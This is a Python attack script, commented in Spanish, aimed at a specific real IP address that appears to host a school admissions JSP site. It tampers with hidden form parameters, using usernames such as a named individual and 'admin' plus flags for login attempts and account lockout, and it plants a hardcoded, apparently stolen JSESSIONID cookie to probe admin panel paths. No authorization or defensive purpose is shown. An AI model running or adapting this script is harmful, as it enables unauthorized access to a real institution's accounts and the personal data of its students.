import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

class HiddenParamsExploiter:
    def __init__(self, target_ip):
        self.target_ip = target_ip
        self.base_url = f"https://{target_ip}"
        self.session = requests.Session()
        self.session.verify = False

    def exploit_hidden_parameters(self):
        """Explota los parámetros ocultos encontrados"""
        print("[*] Explotando parámetros ocultos...")
        
        # Parámetros críticos encontrados
        critical_params = {
            'yUsuario': ['', 'hnieto', 'admin', 'administrador'],
            'yAccion': ['login', 'logout', 'admin', 'debug', 'test'],
            'yIntentos': ['0', '1', '999'],
            'yInteresado': ['0', '1'],
            'yEncuestado': ['0', '1'],
            'yBloqueoG': ['true', 'false'],
            'yMenorEdad': ['0', '1']
        }
        
        # URLs a probar
        test_urls = [
            "/jsp/index.jsp",
            "/jsp/escolar/proceso_admision/proceso_interesado.jsp",
            "/jsp/login.jsp"
        ]
        
        for url in test_urls:
            print(f"\n[+] Probando URL: {url}")
            
            for param, values in critical_params.items():
                for value in values:
                    try:
                        test_data = {param: value}
                        
                        # Añadir parámetros básicos si es un formulario de login
                        if 'login' in url:
                            test_data['xUsuario'] = 'test'
                            test_data['xContrasena'] = 'test'
                        
                        full_url = f"{self.base_url}{url}"
                        response = self.session.post(full_url, data=test_data, timeout=5)
                        
                        # Buscar cambios en la respuesta
                        if response.status_code == 200:
                            if "error" in response.text.lower():
                                print(f"    [!] Error con {param}={value}")
                            elif "éxito" in response.text.lower() or "exito" in response.text.lower():
                                print(f"    [!] Éxito con {param}={value}")
                            elif "acceso" in response.text.lower() and "denegado" not in response.text.lower():
                                print(f"    [+] Acceso posible con {param}={value}")
                                
                    except Exception as e:
                        print(f"    [-] Error con {param}={value}: {e}")

    def manipulate_session_parameters(self):
        """Manipula parámetros de sesión"""
        print("\n[*] Manipulando parámetros de sesión...")
        
        # Usar la sesión activa que tenemos
        self.session.cookies.set('JSESSIONID', 'E79C9B62048BB93857B87CF6FAA56B6B')
        
        # Parámetros de sesión a manipular
        session_params = {
            'yUsuario': 'hnieto',
            'yAccion': 'admin',
            'yIntentos': '0',
            'yInteresado': '1'
        }
        
        admin_urls = [
            "/jsp/admin/index.jsp",
            "/jsp/administracion/panel.jsp",
            "/jsp/escolar/admin/",
            "/jsp/system/dashboard.jsp"
        ]
        
        for url in admin_urls:
            try:
                full_url = f"{self.base_url}{url}"
                
                # Probar con diferentes combinaciones de parámetros
                response = self.session.post(full_url, data=session_params, timeout=5)
                
                if response.status_code == 200:
                    print(f"[+] Acceso a {url} - Status: {response.status_code}")
                    
                    # Verificar si es un panel de administración
                    admin_indicators = ['dashboard', 'panel', 'admin', 'administración', 'usuarios', 'configuración']
                    if any(indicator in response.text.lower() for indicator in admin_indicators):
                        print(f"    [!] ¡Posible panel de administración!")
                        
            except Exception as e:
                print(f"[-] Error en {url}: {e}")

# Ejecutar explotación de parámetros ocultos
print("=== EXPLOTACIÓN PARÁMETROS OCULTOS ===")
params_exploiter = HiddenParamsExploiter("189.254.143.102")
params_exploiter.exploit_hidden_parameters()
params_exploiter.manipulate_session_parameters()